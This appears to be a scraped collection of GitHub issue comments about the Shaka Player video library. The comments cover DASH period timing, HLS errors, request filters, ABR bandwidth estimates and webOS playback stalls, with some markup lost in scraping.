    "dingconggithub": "i got a error, code=4022, message is HLS_MASTER_PLAYLIST_NOT_PROVIDED. thanks a lot for your response, but i don't know how to set the manifest kinds, can you paste the code for me? this is my code, please tell me what's wrong whit it?\nfunction initPlayer() {\n    // Create a Player instance.\n    var video = document.getElementById('video');\n    var player = new shaka.Player(video);\n    shaka.media.ManifestParser.registerParserByExtension(\"m3u8\", shaka.hls.HlsParser);\n    shaka.media.ManifestParser.registerParserByMime(\"Application/vnd.apple.mpegurl\", shaka.hls.HlsParser);\n    //shaka.media.ManifestParser.registerParserByMime(\"application/x-mpegURL\", shaka.hls.HlsParser);\n    // Attach player to the window to make it easy to access in the JS console.\n    window.player = player;\n    // Listen for error events.\n    player.addEventListener('error', onErrorEvent);\n    console.log(player.getConfiguration());\n    // Try to load a manifest.\n    // This is an asynchronous process.\n    player.load(manifestUri).then(function () {\n        // This runs if the asynchronous load is successful.\n        console.log('The video has now been loaded!');\n    }).catch(onError);  // onError is executed if the asynchronous load fails.\n}. your response is very useful for me, i just had a media list before, then, i create a master list, it works, the 4022 error is disappear, but i got a new error code 9009,the message is \n\nWhen the manifest contains no period playable streams, it means the manifest is unsupported by the browser.\n\nmy browser is Chrome version is  63, is this browser unsupported TS file? but which browser  support?. @joeyparrish thanks for your attention, i have deal with the error 4022 with the suggestion given by @ismena . ",
    "sym39": "Thanks a lot for your response. \nI have still questions / need some clarification to make sure I have understood.\nFor what I understand, the most important problems in my implementation is that\n- period.@start must really be set and can not be 0 for all periods\n- the timeline should be the same for all tracks: it is not allowed to have a track that is somewhat shifted in the manifest, even if this does not cause problems with only one period \n\nWhat this means for your case is that each Period needs to have the correct times. The times in the media need to start at 0 within each Period. You can use presentationTimeOffset to adjust the segment times so they start at 0.\n\nSpeaking from 0 confuse me a bit, it reminds me static content. I guess you mean I have to play with period.@start  and @presentationTimeOffset so that the time of a fragment is correct. Something like start_time = ast + period_start - pto + t \n\nEach Period also needs to have a duration. This can be done by using the duration attribute on the  element, or it can be done implicitly by setting the start of the Period that follows it. Many manifests will only use the duration attribute since it makes it easier to add a new Period without having to adjust the start time of every following Period. However, you need to set the start of the first Period or we will assume it is 0, which for live may not be what you want. Since you set the start of every Period to 0, the first Period will have a duration of 0, which is not allowed.\n\nWhat about period that are not complete? I understand I have to ensure the timeline begins at the same time for all tracks (audio/video/text)?\n\nHere is an example: With a availabilityStartTime of 2018-01-01T00:00:00Z, a Period start of PT30S, and a timescale if 1. If a segment starts at 300 with a presentationTimeOffset of 100 that puts the time within the Period at 200 seconds. Add the Period start and the segment will really play 230 seconds into the live stream, or a wall-clock time of 2018-01-01T00:03:50Z.\n\nOK.\n\nAlso note that you need to split Periods at a segment boundary (on all streams). So if you split a stream at 30s; the first Period needs to have at least 30 seconds of content and the first segment of the next Period must start at 0, which will align with the end of the previous Period. If you use presentationTimeOffset to offset the segment and it starts at before 0, we won't be able to play it due to browser limitations. We can only play segments whose period-relative start time is 0 or greater.\n\nOK, I understand I really have to make sure my timeline is the same for all fragments\n\nIf you mean every Period in the manifest has the same id and start time, that is invalid. A Period with the same id must represent the same content. So in a manifest update, if we see a Period with the same id, we will think it is the same as the previous update and try to merge things. Different Periods require different ids.\n\nI was not clear, each period has an unique id inside the MPD, but I take care that those ids remain the same between multiple manifest update.\n\nYou can't have the Period@start be 0 for all Periods, that means that every Period starts at the same time, so they will overlap (which isn't allowed). The Period time must start at the time you want it to appear in the presentation.\n\nWhat is strange is that it looks to work (even if it fails rarely) with only one content (audio or video but not both). May be I was lucky?\n\nNope, just update the manifest. Make sure you set minumumUpdatePeriod so we will fetch the updated manifest.\n\nOK, it was set.\n\nThis may be a bug on our part, but since you are setting all the Periods start to 0, that is likely the problem. You can't have overlapping Periods.\n\nOK, I will see.\n\nThe number of segments per Period doesn't matter and doesn't have to match. The audio and video can have different number of segments and different Periods can have different count. The important thing is that the amount of media content is correct. If the Period says it has a duration of 30 seconds, then you need at least 30 seconds of media content for all streams.\n\nI was not clear, I meant the same number of fragments of same duration (and without discontinuity at all)\n\nI am fairly sure this isn't allowed. I think each AdaptationSet requires at least one Representation. Each Representation requires having segment info. So you can't have a Representation without any segments in it.\n\nI will try to avoid it.\n\nIt doesn't matter. Usually the timescale in the manifest matches the timescale of the media. In this case, the representations won't have the same timescale since audio and video usually use different timescales.\n\nOK.\n\nHopefully this will help. Does this answer all your questions?\n\nThanks a lot, now, it is time to me to change the implementation and to retry.\nSylvain\nPS : Annotated version of a manifest with necessary corrections to make it hopefully correct\nxml\n<MPD\n  xsi:schemaLocation=\"urn:mpeg:dash:schema:mpd:2011 http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd\"\n  availabilityStartTime=\"2015-01-01T00:00:00Z\"             <-- unix timestamp is 1420070400\n  publishTime=\"2018-01-31T22:04:47.310073Z\"\n  minimumUpdatePeriod=\"PT2S\"\n  maxSegmentDuration=\"PT3S\"\n  minBufferTime=\"PT0S\"\n  <Period\n    id=\"period_97365820\"                                   <-- unique period name inside the manifest\n    start=\"PT0S\">                                          <-- period has begun in the past and it is \n    <AdaptationSet                                          -- incomplete because the window length is \n      id=\"1\"                                                -- not long enough\n      <SegmentTemplate\n        timescale=\"48000\"\n        initialization=\"dash2-$RepresentationID$-init.mp4\"\n        media=\"dash2-$RepresentationID$-$Time$.mp4\">\n        <SegmentTimeline>                                  <-- still no presentationTimeOffset means it is 0                                  \n          <S t=\"4673560004160\" d=\"95232\" />                <-- 2018-01-31 22:03:53.4Z (4673560004160/48000.0 = 97365833.42,date -d @$((1420070400+97365833)) \"+%Y-%m-%d %T\" --utc\n          <S d=\"96255\" />                                   -- duration of audio fragments \n          <S d=\"96257\" />                                   -- are around 2 sec.\n          <S d=\"96256\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96257\" />\n          <S d=\"96256\" />\n          <S d=\"95232\" />                                  <-- 9 items, around 18 sec.\n        </SegmentTimeline>                                 ==> first item must be removed so that audio and video begins and ends\n      </SegmentTemplate>                                       at the same time (see below video)\n      <Representation\n        id=\"audio_20005=96000.track_id=20005\"\n      </Representation>\n    </AdaptationSet>\n    <AdaptationSet\n      id=\"2\"\n      <SegmentTemplate\n        timescale=\"25\"\n        initialization=\"dash2-$RepresentationID$-init.mp4\"\n        media=\"dash2-$RepresentationID$-$Time$.mp4\">\n        <SegmentTimeline>                                  <-- still no presentationTimeOffset means it is 0                                  \n          <S t=\"2434145885\" d=\"50\" r=\"7\" />                <-- 2018-01-31 22:03:55.4Z\n        </SegmentTimeline>                                  -- notice the first video begins 2 seconds later than the audio\n      </SegmentTemplate>                                    -- only 8 items (16 seconds)\n      <Representation                                          ==> The timeline must be changed\n        id=\"video=100000.track_id=10000\"                       ==> so that it begins at the same time\n      </Representation>                                        ==> in this case, the first audio fragment may begin one fragment later\n      <Representation                                          ==> to be in sync with video\n        id=\"video=110000.track_id=10001\"\n      </Representation>\n    </AdaptationSet>\n  </Period>\n  <Period\n    id=\"period_97365850\"                                   <-- unique period name inside the manifest, this period is complete\n    start=\"PT0S\">                                          ==> start must be 16 sec\n    <AdaptationSet\n      id=\"1\"\n      <SegmentTemplate\n        timescale=\"48000\"\n        initialization=\"dash2-$RepresentationID$-init.mp4\"\n        media=\"dash2-$RepresentationID$-$Time$.mp4\">\n        <SegmentTimeline>                                  ==> presentationTimeOffset must be 16 sec. (16*48000) so that I do not have to change the t=                                  \n          <S t=\"4673560867392\" d=\"96255\" />                <-- 2018-01-31 22:04:41.4Z\n          <S d=\"96257\" />\n          <S d=\"96256\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96257\" />\n          <S d=\"96256\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96257\" />\n          <S d=\"96256\" />\n          <S d=\"95232\" />\n          <S d=\"96255\" />\n          <S d=\"96257\" />\n          <S d=\"96256\" />                                  <-- 15 items\n        </SegmentTimeline>\n      </SegmentTemplate>\n      <Representation\n        id=\"audio_20005=96000.track_id=20005\"\n      </Representation>\n    </AdaptationSet>\n    <AdaptationSet\n      id=\"2\"\n      <SegmentTemplate\n        timescale=\"25\"\n        initialization=\"dash2-$RepresentationID$-init.mp4\"\n        media=\"dash2-$RepresentationID$-$Time$.mp4\">\n        <SegmentTimeline>                                  ==> presentationTimeOffset must be 16 secs (16*25 here)                                  \n          <S t=\"2434146285\" d=\"50\" r=\"14\" />               <-- 2018-01-31 22:04:11.4Z\n        </SegmentTimeline>                                 <-- 15 items\n      </SegmentTemplate>\n      <Representation\n        id=\"video=100000.track_id=10000\"\n      </Representation>\n      <Representation\n        id=\"video=110000.track_id=10001\"\n      </Representation>\n    </AdaptationSet>\n  </Period>\n  <Period\n    id=\"period_97365880\"                                   <-- unique period name inside the manifest\n    start=\"PT0S\">                                          ==> start must be 16+30=46\n    <AdaptationSet\n      id=\"1\"\n      <SegmentTemplate\n        timescale=\"48000\"\n        initialization=\"dash2-$RepresentationID$-init.mp4\"\n        media=\"dash2-$RepresentationID$-$Time$.mp4\">\n        <SegmentTimeline>                                  ==> presentationTimeOffset must be 46                                  \n          <S t=\"4673562308160\" d=\"95232\" />                <-- 2018-01-31 22:04:11.4Z\n        </SegmentTimeline>                                  -- only one item\n      </SegmentTemplate>                                    \n      <Representation\n        id=\"audio_20005=96000.track_id=20005\"\n      </Representation>\n    </AdaptationSet>\n    <AdaptationSet\n      id=\"2\"\n      <SegmentTemplate\n        timescale=\"25\"\n        initialization=\"dash2-$RepresentationID$-init.mp4\"\n        media=\"dash2-$RepresentationID$-$Time$.mp4\">\n        <SegmentTimeline>                                  ==> presentationTimeOffset must be 46                                  \n          <S t=\"2434147035\" d=\"50\" r=\"1\" />                <-- 2018-01-31 22:04:41.4Z\n         </SegmentTimeline>                                 -- 2 items\n      </SegmentTemplate>                                    ==> Last item must be removed\n      <Representation\n        id=\"video=100000.track_id=10000\"\n      </Representation>\n      <Representation\n        id=\"video=110000.track_id=10001\"\n      </Representation>\n    </AdaptationSet>\n  </Period>\n</MPD>. Thanks again for your response.\nI have modified the way periods are created using your advice, and it is working.\nAt first, I had the assertion Assertion failed: SegmentReferences are incorrect segment_index.js:317:5. The assertion is gone after ensuring the start date of the initial period was fixed to the date of the period, not the date of the first available fragment.\nSylvain\nHere is an example of the manifest (some tags are hidden for clarification)\n```xml\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n```. > Glad to hear you got it working. Does this answer all your questions?\nYes this is OK, thanks a lot again. (So I will close the issue)\nSylvain. ",
    "aminasyeda": "@TheModMaker: Thank you so much for the response. Yes, it was with the mux.js not getting loaded properly in my module loader. Once I fixed it, it started to work. All good for now. Appreciate your help! . ",
    "gwevans": "@joeyparrish I have a question for you about using request filters. I'm looking to dynamically update the manfiestUri for live streaming. I'm pretty new to http streaming so there are probably some gaps in my understanding.\nmanifestUri = www.someurl1.com;\nvar player = new shaka.Player(video);\nplayer.load(manifestUri).then(function() {\n    console.log('The video has now been loaded!');\n  }).catch(onError);\nThen every 10 seconds my manifestUri changes to something else. How would I go about setting up a request filter to change the URI? I'm doing this in react, so I plan to have a componentWillReceiveProps() function where the manifestUri will be updated. Is this where requestFilter comes in or am I completely missing the point?\n. @joeyparrish Thanks for the reply, and yes it does help. I had just stumbled onto that tutorial after I made the comment.\nSo the change in request.uris[0] will seamlessly transition to the new uri without re-rendering the entire player? I don't have an environment to play around with shaka at the moment or else I would give this a go.. @joeyparrish Ok that makes sense. I get that the requestFilter is like an event listener on the requests going out.\nBut how would I manually force registerRequestFilter to execute when I have a new manifestUri? I assume it's not by player.load(newManifestUri), right?. @joeyparrish I'm pretty sure I want to modify the manifest URIs, but I'll describe my problem in more detail just to be clear, you might know more than I.\nI am playing a live stream with constantly changing source urls. Typically (from what I understand) a live stream will have one manifest url, but will constantly grab new segments. Segments have different urls, but the overall manifestUrl is the same. In my case, I'm updating the manifestUrl instead of requesting the new segment url. I'm sending a new .mpd playlist file to the video player every 10-15 seconds instead of fetching a new segment.\nI have the shaka player set up now, and I'm struggling to see the purpose of the registerRequestFilter if I am forcing the manifestUri to change every 10 seconds. It seems like just doing player.load(newManifestUri) does the trick, but I don't want to just load a brand new video, I want to keep the previously loaded video accessible in the player (similar to how segments work).. @joeyparrish Thanks again for the response.\nI definitely do not want #1, I need to support HLS (so no #2), looks like I will have to push forward with #3.\nHowever, I still don't quite understand how a request filter will achieve the desired result. I'm not sure if you're familiar with React or not, but I have a react component that is fetching the manifestUri, which is in turn feeding it to the video player.\nTo feed the new manifestUri to shaka-player, I would do player.load(newManifestUri), which would then execute the requestFilter where the requestType is MANIFEST, right?\nBut once I change that uris[0] to the new manifest (which I currently don't know how to get scope of inside the requestFilter), it will just load a new video and not have any record of the previous piece of content, right?\nI must be missing something of how the requestFilter works.. @joeyparrish \nI guess React isn't really important in this case, just the fact that I have something giving the video updated manifestUris.\nI am told that they are completely separate manifests. manifestUri2 is not just manifestUri with extra segments appended, they are entirely separate segments. . @joeyparrish \nI have just clarified with someone and I was mistaken. manifestUri2 is merely an extension of manifestUri1. . @joeyparrish \nI'm definitely coming off as slow, I apologize. I greatly appreciate the write up here, but I think most of our discussion could have been simplified if I were more clear about what I was confused about.\nI was under the impression that the only times the RequestType will equal MANIFEST is when the user manually alters the manifestUri. I get that RequestType equals SEGMENT every time it's time to load a new segment, but I don't understand when Request will actually equal MANIFEST.\nI had pretty much the same code as below set up with my own player, but I never saw the RequestType equal MANIFEST unless i manually did a player.load() with a new manifestUri. My react component fetches the new manifestUri on its own, but then I somehow need to get inside of the requestFilter to set the request.uris[0] = newManifest. I can't call player.load() without tearing everything down, so I don't know how to get inside the requestFilter to set the request. Does my question make sense?\n```\nplayer.getNetworkingEngine().registerRequestFilter(function(type, request) {\n  if (type != shaka.net.NetworkingEngine.RequestType.MANIFEST) {\n    return;  // ignore non-manifest requests\n  }\nif (mostRecentCachedUriFromReact) {\n    request.uris[0] = mostRecentCachedUriFromReact;\n  }\n});\n```. Ok this clears a lot up for me. I was testing with a link I found online that was claiming to be a live stream, but it seems like it was a VOD then, I'm not sure. I haven't tested any players with the actual live manifests that my services team are providing because they're not ready yet, but I am just being told what is required of me on the front end.\nTo get the new manifestUri I need to make an server call so instead of having my react component feed the shaka player a new manifest, maybe I'll just use the async version you mentioned above. Every time a new chunk is appended to the manifest, the manifestUri changes, so I'll follow the code below and hopefully that will work for me.\n```\nplayer.getNetworkingEngine().registerRequestFilter(function(type, request) {\n  if (type != shaka.net.NetworkingEngine.RequestType.MANIFEST) {\n    return;  // ignore non-manifest requests\n  }\nreturn getManifestServiceCall.then(function(newUri) {\n    request.uris[0] = newUri;\n  });\n});\n```\nSo conceptually, supposed the initial manifestUri has only 1 segment in it. When it gets to the end of the segment it will trigger the requestFilter if I'm not mistaken, but will the RequestType be MANIFEST or SEGMENT? I don't have anything to test with at the moment or else I'd try it.. @joeyparrish \nAwesome, thanks for the explanation. This has been hugely helpful and I appreciate you taking the time to explain these concepts to me. Cheers.. ",
    "huangh0604": "In you opinion, it seems can I have it a try.\nBut when IMA takes over the video tag, it will flush the content buffer that we cached before.\nAlthough, we can use you method to restore to play content at currentTime, we have to reload manifest and cache buffer to video tag.\nAnd it's redundant and waste the bandwidth.\nCry~, Cry~, Cry~\nSo, it seems I have to use google cast sdk which supported ad.\nBut in this way, I can use many special or cutomize features of shaka.player.. ",
    "gabor": "@ismena thank you, this is enough for me, please feel free to close the issue.. ",
    "Er-rchydy": "@theodab \nUnfortunately i didn't understand, I'm a newbie, i notice some links but that's why i don't want to use manifest because i don't deal with links , i'm sending video data ( buffers ) directly from the server so there are no links involved, you will understand what i'm trying to do when you see client code i'm using:\nlet socket = io();\nvar video = document.querySelector('video');\nvar mimeCodec = 'video/mp4; codecs=\"avc1.42E01E, mp4a.40.2\"';\nif ('MediaSource' in window && MediaSource.isTypeSupported(mimeCodec)) \n{\n    var mediaSource = new MediaSource;\n    video.src = URL.createObjectURL(mediaSource);\n    mediaSource.addEventListener('sourceopen', function () {\n            var mediaSource = this;\n            var sourceBuffer = mediaSource.addSourceBuffer(mimeCodec);\n           sourceBuffer.mode = 'sequence'; \n            sourceBuffer.addEventListener('updateend', function (_) { video.play().then(function() { }).catch(function(error) { }); });\n            socket.on('broadcast', function (Buffer) {\n                sourceBuffer.appendBuffer(Buffer);\n            });\n    });\n} else {\n    console.error('Unsupported MIME type or codec: ', mimeCodec);\n}\nYou see, i'm sending buffer from the server every 10 seconds ( segments are 30 seconds each ) using socket , the code above works fine , but i want to use shaka-player instead of html5 video, so i'm looking how can i append buffers that i get from socket to shaka-player, if that makes sense . something like this:\nsocket.on('broadcast', function (Buffer) {\n        // feed the Buffer data to shaka-player\n });. Ok i see, i didn't thought about Shaka Player's features wouldn't work if i feed buffers directly, thanks for pointing to that.. ",
    "chambs": "Seems to work fine when rolling back a change at player.js#onChooseStreams_ at the return statement.\nNot sure what kind of problems this can bring though. From my tests so far, no side effects were found.\njavascript\n  // Don't fire a tracks-changed event since we aren't inside the new Period\n  // yet.\n  // Don't initialize with text stream if the caption is not visible.\n  // if (this.isTextTrackVisible()) {\n  //   return { variant: chosenVariant, text: chosenTextStream };\n  // } else {\n  //   return { variant: chosenVariant, text: null };\n  // }\n  return { variant: chosenVariant, text: chosenTextStream };. ",
    "DanDeMicco": "Hey @joeyparrish thanks for the super fast response! That was a good idea but unfortunately it doesn't work in 2.1.8, the start doesn't get set correctly. Assuming I upgrade to the latest version, do you see any problems with my original code or is there a better way?\nEdit: apparently the original way I posted is not working, and setting currentTime doesnt seem to be a good approach. Here I am setting the opt_startTime to 500 (invalid), then setting back to 0 in streaming event: https://codepen.io/anon/pen/MQoERE it still goes to END_TIME - 1\n. Hey @joeyparrish, definitely will look into upgrading, but even that doesn't work entirely. I linked a codepen above in my edit which has the latest v2.3.2 and a demo example of what I am trying to do.\nIn my codepen, tried changing player.getMediaElement().currentTime in both the streaming event and player callback, and the playback still starts at t=END_TIME - 1 if opt_startTime is invalid.\nI have also tried not setting opt_startTime and just setting player.getMediaElement().currentTime. This starts it at t=0. Here is a codepen for this: https://codepen.io/anon/pen/oEeeVW. @joeyparrish here is a repro based off your script:\nRepro steps:\nVisit https://shaka-player-demo.appspot.com/demo/#asset=//storage.googleapis.com/shaka-demo-assets/sintel-mp4-only/dash.mpd;lang=en-US;play;build=uncompiled\njavascript\nvideo.pause();\nvideo.currentTime = 210;\nshakaDemo.localPlayer_.setTextTrackVisibility(true);\nsetTimeout(function(){\n    shakaDemo.localPlayer_.setTextTrackVisibility(false);\n}, 1000);\nsetTimeout(function(){\n    shakaDemo.localPlayer_.setTextTrackVisibility(true);\n}, 2000);\nAnother interesting bug which came up (intermittent 25-50%), subtitles appear twice in safari\n\njavascript\nvideo.play();\nvideo.pause();\nvideo.currentTime = 210;\nshakaDemo.localPlayer_.setTextTrackVisibility(true);\nsetTimeout(function(){\n    shakaDemo.localPlayer_.setTextTrackVisibility(false);\n    shakaDemo.localPlayer_.setTextTrackVisibility(true);\n}, 100);. @joeyparrish seems to be resolved in latest release! Thanks for looking into it. Closing the issue . ",
    "davisjam": "Sounds good. Link to the bug report and I can also take a peek at a fix.. @joeyparrish I have contacted the code-prettify devs by email. I CCd you in case you want to weigh in or point out the prettify fork.. ",
    "techterbium": "Thanks for the reply @joeyparrish. . ",
    "Kogoruhn": "I use shaka player on webOS 3.5. Non-encrypted and Widevine DASH .mpd works well.\nHLS (with help of mux.js) video looks like slideshow. (On Tizen and Chrome no problem). Honestly, I've tried to compile both - with & w/o adm. rights, got same result... Thanks for response!. YAY! Shaka compiled! @TheModMaker U were right!\nbuild/shakaBuildHelpers.py:\ndef get_source_base():\n  \"\"\"Returns the absolute path to the source code base.\"\"\"\n  source_base = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))\n  # In the build files, we use '/' in the paths, however Windows uses '\\'.\n  # Although Windows supports both, the source mapping will not work with '\\'.\n  # So we use Linux-style paths for everything.\n  return source_base.replace('\\\\', '/')\nset return source_base. Thats it. And for pass the check in compiler.by\nassert source_base[-1] == '\\\\', 'Source base format changed!'. @joeyparrish \n\nSame error that was in my \"repair\"... \nin /dist: shaka-player.compiled.debug.js, shaka-player.ui.debug.js (+ .map, .externs)\nBut anyway, now i got what i want:)\n. Similar problem on WebOS (SDK Version: 3.3.0, Firmware Version: 05.30.25) with HLS. \nDrm-ed .mpd plays normal, but m3u8 streams lagging every 3-4 seconds for a 2-3 sec... For hls i use mux.js\nOn win desktop & Tizen both streams works fine.\n. I think, this may be due to the webOS jvm oddity (just a guess). > After investigate a bit, I found that the function shaka.media.GapJumpingController.prototype.handleStall_ cause the stall in the TV. If use the condition if (!this.video_.paused && this.video_.playbackRate > 0 && !navigator.userAgent.includes('Web0S')) { all works perfectly.\n@avelad Hi! I noticed, that when handleStall_ fires, default condition\n(!this.stallCorrected_ && this.stallWallTime_ < Date.now() - 1000) passed because on WebOS (in my case) stallWallTime_  almost every time is a little bit more than Date.now() - 1000, e.g.\nstallWallTime_ = 1545311690351 when Date.now()= 1545311691368\nSo we can just increase this 'time of trust' to 1200-1500.\nupd\nBut on first 5-10 seconds of playback still get hickups.\n. @ismena Yep, just an enhancement request, sorry for unclear start message... Im slow anytime X)\nPlayback is blinking now, as on youtube. But in our project we want soft transition after resolution changes.\nSo we should keep current buffer info and wait for the next chunks with new resolution.. @avelad looks so. Btw, I've tried your decision with looking for webos ua, but the problem didnt pass.. Perfomance comparing gave interesting results: 22ms against 1071 ms\n\nPC\n\n\n\nWebOS\n\n\n. Ive extracted transmuxing logic to worker, js-timings become cool. But big freezings still remained (lol)\nThen I increased 'trust interval' to 2k and so now i have almost normal playback with tiny, hardly-seen freezes.. @avelad I think so too :) \nThanks for the fix, ill try it later!\nAnd please, remove stream link from your last message, I deleted link from topic start just now.. When i create my own worker, i have keeked  in videojs transmuxer worker. If anybody want, i can attach result here.. @vaage With hosted app & custom manifest im able to reproduce freezes in Chrome(~0.2-0.4 sec). \nIn hosted app problem does not occur every time (about 1 from 3 manifest loads). In order for them to appear, you need to wait a while (about 1-1.5 min of playback).\nConsole throws periodically Jumping forward [n] seconds to catch up with the seek range. .\nWith log level \"Very Verbose\" I could relate the time of freezing and fetchAndAppend_ in console.\nNo back-jumping of playhead, no loader appears.\nIn firefox still no freezes or console 'jumpings'.\nPS: Ive tried then \"Shaka Player History (live, HLS)\", got MANIFEST.HLS_COULD_NOT_PARSE_SEGMENT_START_TIME; \"Axinom Clear, Live HLS\" plays w\\o any bugs.. ",
    "wkuranowski": "I can also reproduce this problem in DASH live streams. If you have any fixes, I will be happy to test them.. I can tell you that problem appeared in 2.3.3.\n. So it seems that the lowest frequency of manifest downloading should not be lower than what is needed for smooth playback of a given stream.. Yes, this is exactly what I am seeing.\nIs it possible to use the duration of content in manifest to determine the lowest refresh frequency of the manifest?\n. ",
    "damienlevin": "@joeyparrish Quick note, for fMP4 you also want to add support for multiple EXT-X-MAP. In the case of ad insertion the encoding setting as well as the timestamp/timescale of the ad and content is likely not going to match (which is why you have a discontinuity in the first place). So you will need to reinitialize the decoder setting by loading the initialization segment present in the EXT-X-MAP following any DISCONTINUITY. A fmp4/cmaf style playlist should look like this:\n```\nEXT-X-MAP:URI=\"content-init.mp4\"\nEXTINF:2\ncontent-1.mp4\nEXTINF:2\ncontent-2.mp4\nEXT-X-DISCONTINUITY\nEXT-X-MAP:URI=\"ad-init.mp4\"\nEXTINF:2\nad-1.mp4\nEXTINF:2\nad-2.mp4\nEXTINF:7\nad-3.mp4\nEXT-X-DISCONTINUITY\nEXT-X-MAP:URI=\"content-init.mp4\"\nEXTINF:2\ncontent-3.mp4\nEXTINF:2\ncontent-4.mp4\n```. Very good catch on the bad segment - I'll try to update that sample content I posted.\nAlso, by doing a quick look at the code there doesn't seems to be support for emsg version 1, is that correct ? If so, I'm happy to create a sample stream and open an issue.\nThanks.. Until I file a ticket with a sample stream, you can look at CMAF spec:  https://www.iso.org/standard/71975.html and https://www.iso.org/standard/68960.html\n. Great thanks. \nI'll try to TAL this week.. ",
    "arjen4157": "@TheModMaker Yes, it does. Thanks for the replies.\nNote: I've updated the stream mentioned above, so it's not relevant for this issue anymore.. ",
    "andreymal": "-use_template 1 creates SegmentTemplate without duration, perhaps this is the reason why this did not help me.\nBut after your comment, I noticed that -use_template 1 -use_timeline 0 creates SegmentTemplate with duration, and now shaka player has ~2.5s delay as expected, thanks for the help! (Looks like -use_timeline argument was implicitly enabled by default, ffmpeg documentation has nothing about defaults.)\nP.S. ~~But your link is not working now, it prints Shaka Error NETWORK.HTTP_ERROR (chunk-stream0-00001.m4s, TypeError: NetworkError when attempting to fetch resource.,1) :)~~ UPD 22.03: now it works :). Another small question about this stream (uses -use_template 1 -use_timeline 0 now): shaka downloads chunk [N] while chunk [N+3] is also available:\n\nIs it possible to reduce the delay here?. I tried to change availabilityStartTime., but it's dangerous: shaka can try to download a nonexistent chunk :)\nIt seems that 2s delay is the minimum limit in practice. Thanks for the answer!. ",
    "ericmatthys": "defaultBandwidthEstimate is working correctly. It will allow a higher quality stream to be selected by default. I'm experiencing issues with actual bandwidth estimates seemingly more conservative than necessary. I know this is not very empirical, but bandwidth estimates with abr seem to select stream qualities below what is possible with abr disabled. I'm able to easily buffer ahead with the highest quality stream and abr disabled, but the calculated bandwidth estimates end up choosing a lower quality stream when abr is enabled. Often, bandwidth estimates gradually increase throughout the video. Let me know what I can do to help, as I'm not giving you much actionable data here.. Mostly, although the default estimate is mostly irrelevant to the problem. Let's say I configure a very high default estimate. It'll start at the highest quality stream. The initial bandwidth estimate that comes back after the minimum total bytes required for an estimate is met is lower than what my network speed should allow, forcing a switch to a lower quality. From there, it's usually a slow rise back up to a higher quality as the bandwidth estimates increase. This is frustrating because my network could have easily played the highest quality stream, so the estimates seem wrong or overly conservative.\nI'll give the switchInterval and bandwidthUpgradeTarget configuration changes a try.. Thanks for the input! I'm not trying to compare the bandwidth estimate with my download speed. I'm just comparing my experience with abr enabled compared to abr disabled. I get smooth playback with no buffering and fairly quick start times using the highest quality stream with abr disabled, so it seems unexpected for abr to choose lower quality streams. I know that's not very scientific though. I'll play with the configuration more and let you know.. I played with those configuration options and I think the effect is too subtle to make an impact on my scenario. Here are some (cleaned) logs showing the issue:\n(video:4) startup complete\nLoad latency: 3.613\ncanSwitch_\nCalling switch_(), bandwidth=1932 kbps\nswitch: switching to Stream (video:6)\nCalling switch_(), bandwidth=2730 kbps\nswitch: switching to Stream (video:5)\nCalling switch_(), bandwidth=3196 kbps\nswitch: switching to Stream (video:4)\nCalling switch_(), bandwidth=3988 kbps\nswitch: Stream (video:4) already active\nCalling switch_(), bandwidth=4503 kbps\nswitch: switching to Stream (video:3)\nCalling switch_(), bandwidth=5893 kbps\nswitch: Stream (video:3) already active\nCalling switch_(), bandwidth=5552 kbps\nswitch: Stream (video:3) already active\nCalling switch_(), bandwidth=6057 kbps\nswitch: Stream (video:3) already active\nCalling switch_(), bandwidth=6602 kbps\nswitch: Stream (video:3) already active\nCalling switch_(), bandwidth=5856 kbps\nswitch: Stream (video:3) already active\nCalling switch_(), bandwidth=7081 kbps\nswitch: Stream (video:3) already active\nCalling switch_(), bandwidth=8226 kbps\nswitch: Stream (video:3) already active\nCalling switch_(), bandwidth=7945 kbps\nswitch: Stream (video:3) already active\nCalling switch_(), bandwidth=8189 kbps\nLower video indices are higher qualities, so 3 is high and 6 is low. You can see the default estimate starts with video 4. The initial estimate comes back and it drops to 6. Then one by one, it increases quality until it sits at video 3.\nCompounding the problem, I think load will start with fresh estimates each time, so after that video completes or is skipped, the next video will not use any of the previous bandwidth knowledge. This means that the next video starts this climb all over again. With abr disabled or when forcing artificially high estimates from the estimator, there are no problems with buffering.\nI've tried two things to counteract this: (1) listen to the adaptation event and use player.getStats().estimatedBandwidth to keep track of these estimates and store them per hostname. When another video is played, if there is already a known estimate from a previous playback, it will use that as defaultBandwidthEstimate. (2) I've increased the minTotalBytes_ property in the estimator that is required for calculated estimates to be used instead of the default estimate. This at least gives the estimator more time before it attempts a switch. Obviously the latter isn't ideal since I don't think there's an official configuration option for changing that.. @ismena No worries. Yes, that is with a higher defaultBandwidthEstimate.. ",
    "waxidiotic": "Hey @joeyparrish - there hasn't been an update on this since March so I just want to make sure this still looks like it will make it in to 2.5.0. We have a customer that has a similar issue, but not exactly. They're pointing the player to a php file which does a 302 redirect to the MPD. Each time Shaka requests the master manifest, it requests the php again which adds time to each request.\nThis looks like this enhancement to make the redirects \"sticky\" would relieve this as well, right?. @joeyparrish My apologies - the customer is apparently not using PHP redirects but just normal 302's. The person who reported it to me was just using PHP to simulate it.\nEither way, is there an ETA on 2.5.0?. @joeyparrish  I'm getting the same (504) response now, but it wasn't this way when I submitted it. Let me reach out to the customer to see what's going on.. Here's an updated URL: https://cdn-test.online.meo.pt/sdash/LIVE%24Trailers_VideoClube/index.mpd/Manifest?device=DASH&start=LIVE&end=END. @joeyparrish Yeah, that sounds like the point in which it looks like our player is stalling, because we're not displaying the buffer spinner. However, I'm confused why the playback of the stream below starts right away for us in our player:\nhttps://wowzaec2demo.streamlock.net/live/bigbuckbunny/manifest_mpm4sav_mvtime.mpd\nIt also has a minBufferTime of 6 seconds.. This is amazing @joeyparrish. Thank you so much. I'll relay this to the customer.. @joeyparrish Nah, I think we're good.. Thanks @mborecki and @BucherTomas - I'll look into serverCertificate.. ",
